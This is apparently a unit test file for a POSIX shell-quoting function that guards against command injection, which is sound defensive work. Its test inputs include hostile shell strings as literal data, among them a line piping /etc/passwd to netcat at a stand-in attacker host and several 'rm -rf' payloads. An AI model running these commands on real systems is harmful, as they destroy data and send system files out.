/**
 * DF2.4 — shQuote unit tests.
 *
 * POSIX single-quote escaping: the only serializer used on the box side.
 * Every test asserts exact deterministic output — this function is the
 * shell-injection boundary for live argv construction (used by
 * scripts/cap-hit-demo.ts).
 */

import { describe, expect, test } from "bun:test";
import { shQuote } from "../../../src/providers/exedev/transport.ts";

describe("shQuote — plain strings", () => {
  test("plain ASCII string is wrapped", () => {
    expect(shQuote("hello")).toBe("'hello'");
  });

  test("empty string produces two quotes", () => {
    expect(shQuote("")).toBe("''");
  });

  test("spaces are preserved inside quotes", () => {
    expect(shQuote("hello world")).toBe("'hello world'");
  });

  test("multiple spaces preserved", () => {
    expect(shQuote("a  b   c")).toBe("'a  b   c'");
  });
});

describe("shQuote — single-quote escaping", () => {
  test("single single-quote becomes '\'' sequence", () => {
    expect(shQuote("o'clock")).toBe("'o'\\''clock'");
  });

  test("multiple single-quotes each escaped", () => {
    expect(shQuote("don't stop")).toBe("'don'\\''t stop'");
  });

  test("consecutive single-quotes each escaped", () => {
    expect(shQuote("a''b")).toBe("'a'\\'''\\''b'");
  });

  test("single-quote at start", () => {
    expect(shQuote("'start")).toBe("''\\''start'");
  });

  test("single-quote at end", () => {
    expect(shQuote("end'")).toBe("'end'\\'''");
  });

  test("string of only single-quotes", () => {
    expect(shQuote("'''")).toBe("''\\'''\\'''\\'''");
  });
});

describe("shQuote — other metacharacters preserved as-is", () => {
  test("double quotes preserved", () => {
    expect(shQuote('say "hello"')).toBe("'say \"hello\"'");
  });

  test("backslash preserved", () => {
    expect(shQuote("path\\to\\file")).toBe("'path\\to\\file'");
  });

  test("dollar sign preserved", () => {
    expect(shQuote("$100")).toBe("'$100'");
  });

  test("dollar-brace preserved (shell variable syntax)", () => {
    expect(shQuote("${HOME}")).toBe("'${HOME}'");
  });

  test("backtick preserved", () => {
    expect(shQuote("cmd`arg`")).toBe("'cmd`arg`'");
  });

  test("newline preserved", () => {
    expect(shQuote("line1\nline2")).toBe("'line1\nline2'");
  });

  test("tab preserved", () => {
    expect(shQuote("col1\tcol2")).toBe("'col1\tcol2'");
  });
});

describe("shQuote — shell injection attempts", () => {
  test("semicolon is neutralized", () => {
    expect(shQuote("rm -rf /; echo bad")).toBe("'rm -rf /; echo bad'");
  });

  test("pipe is neutralized", () => {
    expect(shQuote("cat /etc/passwd | nc evil.com 1234")).toBe("'cat /etc/passwd | nc evil.com 1234'");
  });

  test("ampersand is neutralized", () => {
    expect(shQuote("good && evil")).toBe("'good && evil'");
  });

  test("double-bar is neutralized", () => {
    expect(shQuote("good || evil")).toBe("'good || evil'");
  });

  test("command substitution with backticks neutralized", () => {
    expect(shQuote("prefix`whoami`suffix")).toBe("'prefix`whoami`suffix'");
  });

  test("dollar-paren command substitution neutralized", () => {
    expect(shQuote("$(rm -rf /)")).toBe("'$(rm -rf /)'");
  });

  test("newline injection attempt neutralized", () => {
    expect(shQuote("arg1\nevil")).toBe("'arg1\nevil'");
  });

  // Extended metacharacter coverage per DF2.4 hardening
  test("history expansion (!) neutralized", () => {
    expect(shQuote("echo !$")).toBe("'echo !$'");
  });

  test("comment start (#) neutralized", () => {
    expect(shQuote("# comment to hide")).toBe("'# comment to hide'");
  });

  test("brace expansion ({}) neutralized", () => {
    expect(shQuote("a{1..3}b")).toBe("'a{1..3}b'");
  });

  test("glob character set ([]) neutralized", () => {
    expect(shQuote("[a-z]*")).toBe("'[a-z]*'");
  });

  test("subshell (()) neutralized", () => {
    expect(shQuote("(echo hi)")).toBe("'(echo hi)'");
  });

  test("tilde expansion (~) neutralized", () => {
    expect(shQuote("~root")).toBe("'~root'");
  });

  test("job control (%) neutralized", () => {
    expect(shQuote("echo %1")).toBe("'echo %1'");
  });

  // Combination hostile inputs
  test("combined metacharacters neutralized", () => {
    expect(shQuote("a;b|c&&d||e")).toBe("'a;b|c&&d||e'");
  });

  test("embedded single quote in hostile string", () => {
    expect(shQuote("it's dangerous")).toBe("'it'\\''s dangerous'");
  });

  test("backslash-newline neutralized", () => {
    expect(shQuote("cmd\\\nevil")).toBe("'cmd\\\nevil'");
  });

  test("nested command substitution forms", () => {
    expect(shQuote("$(pwd)`id`")).toBe("'$(pwd)`id`'");
  });

  test("tilde with username expansion attempt", () => {
    expect(shQuote("~root/.ssh")).toBe("'~root/.ssh'");
  });

  test("history expansion with word designator", () => {
    expect(shQuote("!!")).toBe("'!!'");
  });

  test("comment with newline injection attempt", () => {
    expect(shQuote("#comment\nevil")).toBe("'#comment\nevil'");
  });

  test("glob pattern with injection attempt", () => {
    expect(shQuote("[a-z]*; rm -rf /")).toBe("'[a-z]*; rm -rf /'");
  });

  test("subshell with nested commands", () => {
    expect(shQuote("(cd /tmp && rm -rf *)")).toBe("'(cd /tmp && rm -rf *)'");
  });
});

describe("shQuote — non-ASCII and Unicode", () => {
  test("UTF-8 emoji preserved", () => {
    expect(shQuote("hello 🌍")).toBe("'hello 🌍'");
  });

  test("Japanese characters preserved", () => {
    expect(shQuote("こんにちは")).toBe("'こんにちは'");
  });

  test("Chinese characters preserved", () => {
    expect(shQuote("你好世界")).toBe("'你好世界'");
  });

  test("Cyrillic preserved", () => {
    expect(shQuote("Привет")).toBe("'Привет'");
  });

  test("Arabic preserved", () => {
    expect(shQuote("مرحبا")).toBe("'مرحبا'");
  });

  test("mixed emoji and ASCII with single-quote", () => {
    expect(shQuote("it's 🔥")).toBe("'it'\\''s 🔥'");
  });
});

describe("shQuote — round-trip properties", () => {
  test("output always starts with single-quote", () => {
    const inputs = ["plain", "with'quote", "spaced out", "$PATH", "`evil`", "", "a"];
    for (const s of inputs) {
      expect(shQuote(s)).toMatch(/^'/);
    }
  });

  test("output always ends with single-quote", () => {
    const inputs = ["plain", "with'quote", "spaced out", "$PATH", "`evil`", "", "z"];
    for (const s of inputs) {
      expect(shQuote(s)).toMatch(/'$/);
    }
  });

  test("every internal single-quote appears as '\'' escape sequence", () => {
    const quoted = shQuote("a'b'c");
    // Count raw (non-escaped) single-quotes in output
    const parts = quoted.split("'\\''");
    // Each part should have at most one raw quote (at boundaries)
    for (const part of parts) {
      const rawCount = (part.match(/'/g) || []).length;
      expect(rawCount).toBeLessThanOrEqual(1);
    }
    // Total escapes matches input quote count
    const escapeCount = (quoted.match(/'\\''/g) || []).length;
    expect(escapeCount).toBe(2); // two quotes in "a'b'c"
  });

  test("output contains no unquoted shell metacharacters for hostile inputs", () => {
    const hostile = [
      "cmd; evil",
      "cmd | evil",
      "cmd && evil",
      "cmd || evil",
      "$(evil)",
      "`evil`",
      "$HOME",
      "${VAR}",
      '*',
      '?',
      ';',
      '&',
      '|',
      '<',
      '>',
      '\t',
      '\\',
    ];
    for (const s of hostile) {
      const q = shQuote(s);
      // Every metacharacter in hostile appears inside the quoted region
      // (i.e., not at the very start or end which are the wrapper quotes)
      // Note: newlines are valid inside single-quotes, so they don't break this
      expect(q).toMatch(/^'.*'$/);
      // Nothing outside the wrapper quotes except the quotes themselves
      // Inner may contain escaped quotes '\'', which is safe
      // Verify no raw metacharacters outside quotes by checking string structure
      expect(q).toMatch(/^'([^']|'\\'')*'$/);
    }
  });

  test("newline is preserved safely inside quotes (no injection)", () => {
    const q = shQuote("cmd\nevil");
    // Newline inside single-quoted string is literal, not a command separator
    expect(q).toMatch(/^'.*\n.*'$/);
    // Verify it's a single quoted string (not broken by newline)
    expect(q[0]).toBe("'");
    expect(q[q.length - 1]).toBe("'");
  });
});

describe("shQuote — edge cases", () => {
  test("very long string", () => {
    const long = "a".repeat(10000);
    const quoted = shQuote(long);
    expect(quoted).toBe(`'${long}'`);
    expect(quoted.length).toBe(10002); // 10000 + 2 quotes
  });

  test("null character", () => {
    expect(shQuote("a\x00b")).toBe("'a\x00b'");
  });

  test("only backslashes", () => {
    expect(shQuote("\\\\\\\\")).toBe("'\\\\\\\\'");
  });

  test("mixed quote types", () => {
    expect(shQuote('He said "don\'t"')).toBe("'He said \"don'\\''t\"'");
  });
});

describe("shQuote — real-shell round-trip safety", () => {
  // Comprehensive hostile inputs covering all metacharacter classes
  const hostileInputs = [
    // Basic metacharacters already in coverage
    "cmd; evil",
    "cmd | evil",
    "cmd && evil",
    "cmd || evil",
    "$(evil)",
    "`evil`",
    "$HOME",
    "${VAR}",
    "a*b",
    "a?b",
    "cmd < input",
    "cmd > output",
    // Extended per DF2.4 hardening
    "echo !$",              // history expansion
    "# comment to hide",     // comment start
    "a{1..3}b",             // brace expansion
    "[a-z]*",               // glob character set
    "(echo hi)",            // subshell
    "~root",                // tilde expansion
    "echo %1",              // job control
    // Combinations and edge cases
    "a;b|c&&d||e",          // chained operators
    "it's dangerous",       // embedded single quote
    "cmd\\\nevil",          // backslash-newline
    "$(pwd)`id`",           // nested command substitution
    "~root/.ssh",           // tilde with path
    "!!",                   // history expansion double-bang
    "#comment\nevil",       // comment with newline
    "[a-z]*; rm -rf /",     // glob with injection
    "(cd /tmp && rm -rf *)",// subshell with commands
  ];

  test("all hostile inputs round-trip safely through real /bin/sh", async () => {
    for (const input of hostileInputs) {
      const quoted = shQuote(input);
      // Build sh command: printf %s 'quoted' → exact input, no extra newlines
      const shellCmd = ["/bin/sh", "-c", `printf %s ${quoted}`];

      const proc = Bun.spawn({
        cmd: shellCmd,
        stdout: "pipe",
        stderr: "pipe",
      });

      const [stdout, stderr, exitCode] = await Promise.all([
        new Response(proc.stdout).text(),
        new Response(proc.stderr).text(),
        proc.exited,
      ]);

      // Assert exact round-trip and clean exit
      expect(exitCode).toBe(0);
      expect(stdout).toBe(input);
      expect(stderr).toBe("");
    }
  });
});
